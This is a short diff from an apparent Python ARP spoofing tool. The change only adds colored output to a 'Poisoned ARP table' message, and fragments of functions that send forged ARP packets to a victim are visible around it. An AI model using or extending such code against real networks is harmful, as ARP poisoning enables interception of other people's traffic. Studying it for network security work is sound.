@@ -38,7 +38,7 @@ def arpspoof(macAttacker, macVictim, ipToSpoof, ipVictim, interface):
         sendp(arp, iface = interface)
     else:
         sendp(arp)
-    print 'Poisoned ARP table of ' + ipVictim
+    print colores.GREEN + 'Poisoned ARP table of ' + ipVictim + colores.RESETALL
     
 def arppoison(victimIP, ipToSpoof, attackerIP, interface):
     victimMAC = getmac(victimIP, interface)
